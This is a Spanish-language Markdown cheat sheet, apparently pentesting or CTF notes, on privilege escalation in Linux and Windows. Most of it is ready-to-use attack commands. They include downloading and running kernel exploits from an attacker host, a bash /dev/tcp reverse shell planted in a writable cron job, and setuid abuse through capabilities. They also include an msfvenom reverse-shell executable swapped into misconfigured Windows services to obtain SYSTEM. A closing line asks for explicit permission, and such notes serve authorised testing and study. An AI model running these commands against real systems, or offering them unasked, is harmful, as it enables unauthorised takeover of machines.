# ESCALAR PRIVILEGIOS 🔓🚀

La escalada de privilegios es el proceso de obtener mayores permisos en un sistema comprometido. Aquí se describen varias técnicas para escalar privilegios en **Linux** y **Windows**.

---

## LINUX 🐧

### OPCIÓN SENCILLA 💥

#### **Vulnerabilidad Kernel**
1. Buscamos un exploit en Google o **searchsploit**.
2. Copiamos el exploit:
   ```bash
   searchsploit -m PATH
   ```
   O creamos un archivo y copiamos el código del exploit.
3. Subimos el exploit al objetivo:
   ```bash
   python3 -m http.server 8080
   wget http://<IP ATACANTE>:8080/exploit
   ```
4. Ejecutamos el exploit:
   ```bash
   ./exploit
   ```

#### **Compilar el Exploit**
```bash
gcc 37292.c -o exploit
```

---

### TECNICA SUDO 🔑

1. **`sudo -l`** => Ver qué comandos son vulnerables para escalar privilegios.
2. Visita **gtfobins.github.io** para encontrar los comandos vulnerables.
3. Filtra por **sudo** y busca un comando vulnerable (por ejemplo: `find`).
4. Copia el comando y ejecútalo.
5. Escala a **root**.

---

### TECNICA SUID 🔒

1. **Buscar comandos vulnerables SUID**:
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```
2. Visita **gtfobins.github.io** para buscar vulnerabilidades.
3. Filtra por **SUID**.
4. Encuentra el comando vulnerable y ejecuta el código proporcionado.
5. **Dar permisos SUID**:
   ```bash
   chmod 4755 /usr/bin/find
   ```

**IMPORTANTE**: Adquirimos los permisos del propietario del archivo (puede ser **root** u otro usuario).

---

### TECNICA CRON JOBS ⏰

1. **Ver las tareas programadas**:
   ```bash
   cat /etc/crontab
   ```
2. Busca tareas que puedas modificar.
3. Modifica el archivo y escribe una reverse shell para que se ejecute cuando toque la tarea:
   ```bash
   bash -i >& /dev/tcp/IP_ATACANTE/PUERTO 0>&1
   ```
4. Pon en escucha tu máquina atacante:
   ```bash
   nc -lnvp PUERTO
   ```
5. Espera que la tarea se ejecute y recibirás una reverse shell con privilegios **root**.

---

### CAPABILITIES (Persistencia) 🔑

1. **Buscar Capabilities en gtfobins**: **python** o **php** son los más comunes.
2. Usar los comandos proporcionados por **gtfobins** como **root**:
   ```bash
   sudo setcap cap_setuid+ep python
   ```
   **Si no funciona**:
   ```bash
   readlink -f /usr/bin/python3
   setcap cap_setuid+ep /usr/bin/python3.8
   ```
3. Para usar la **capability** como **user**, ejecuta el siguiente comando de gtfobins:
   ```bash
   ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
   ```
4. Escalas a **root**.

---

## WINDOWS 🖥️

### **SERVICE EXPLOIT: INSECURE SERVICE PERMISSIONS** 🔐

1. Debemos tener **Sysinternals** para usar **accesschk.exe**.
2. Verifica los permisos en la carpeta:
   ```bash
   accesschk.exe /accepteula -uwdq "C:\Program Files\..."
   ```
3. Busca información sobre el servicio:
   ```bash
   sc qc SERVICIO
   ```
4. Crea una reverse shell con **msfvenom**:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
   ```
5. Subimos el archivo a la máquina objetivo:
   ```bash
   python -m http.server 8080
   curl -O http://IP_ATACANTE:8080/reverse.exe
   ```
6. Cambiamos la ruta de ejecución del servicio:
   ```bash
   sc config daclsvc binpath= "\"C:\Users\user\reverse.exe\""
   ```
7. Pon en escucha tu máquina atacante:
   ```bash
   nc -lvnp 4444
   ```
8. Ejecuta el servicio:
   ```bash
   net start SERVICIO
   ```
9. Obtienes una reverse shell como **SYSTEM**.

---

### **SERVICE EXPLOIT: UNQUOTED SERVICE PATH** 💥

Esta vulnerabilidad ocurre por no poner comillas a la ruta del servicio. Puedes crear una reverse shell con el nombre adecuado para que se ejecute.

1. Pasos 1 a 4 son los mismos que en **INSECURE SERVICE PERMISSIONS**.
2. Crea o renombra la reverse shell:
   ```bash
   ren reverse.exe Common.exe
   ```
3. Copia la reverse shell a la ruta del servicio:
   ```bash
   copy C:\User\user\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
   ```
4. Pon en escucha tu máquina atacante:
   ```bash
   nc -lvnp 4444
   ```
5. Ejecuta el servicio:
   ```bash
   net start SERVICIO
   ```
6. Obtienes una reverse shell como **SYSTEM**.

---

### **SERVICE EXPLOIT: INSECURE SERVICE EXECUTABLES** 🔄

Esta vulnerabilidad ocurre cuando un servicio tiene permisos para ejecutar y modificar archivos por todos los usuarios del sistema.

1. Sigue los mismos pasos que en **UNQUOTED SERVICE PATH**, pero asegúrate de que el nombre de tu reverse shell coincida con el servicio.
2. Si el servicio se llama **filepermservice.exe**, copia tu reverse shell con el mismo nombre:
   ```bash
   copy C:\User\user\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
   ```

---

> **Nota** 📝: Asegúrate de tener permisos explícitos para realizar estas pruebas de escalada de privilegios. ⚠️
```
